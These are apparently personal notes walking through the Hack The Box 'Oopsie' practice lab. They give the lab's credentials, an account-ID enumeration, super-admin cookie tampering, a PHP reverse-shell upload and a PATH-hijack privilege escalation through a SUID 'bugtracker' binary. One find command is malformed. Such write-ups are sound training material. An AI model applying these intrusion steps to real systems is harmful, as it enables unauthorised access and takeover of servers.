# Hack The Box : Starting Point : Oopsie
```
Export IP = 10.10.10.28
```

## Archetype Credential
```
user : admin or administrator
password : MEGACORP_4dm1n!!
```

## SCAN
```
22 tcp 
80 http
```

## Enumerate
```
1. BurpSuite Site MAP Detect

2. http://export_ip/cdn-cgi/login
```

## Gaining Access
```
1. http://export_ip/admin.php?content=accounts&id=1

2. FILE Reference : SuperAdminFind.py

3. Super Admin Cookie Modifyed

4. php-reverse-shell.php upload

5. http://export_ip/uploads/php-reverse-shell.php
```

## USER CREDENTIAL
```
FILE PATH : /var/www/html/cdn-cgi/login/db.php

USER : robert
PASSWORD : M3g4C0rpUs3r!

```

## Privilige Escalate
```
1. check it "id" command

2. find / -type -f -group bugtracker 2>/dev/null

3. /usr/bin/bugtracker

-- cat /root/report.txt
--- export PATH=/tmp:$PATH
--- cd /tmp/
--- echo "/bin/sh" > cat
--- chmod +x cat
```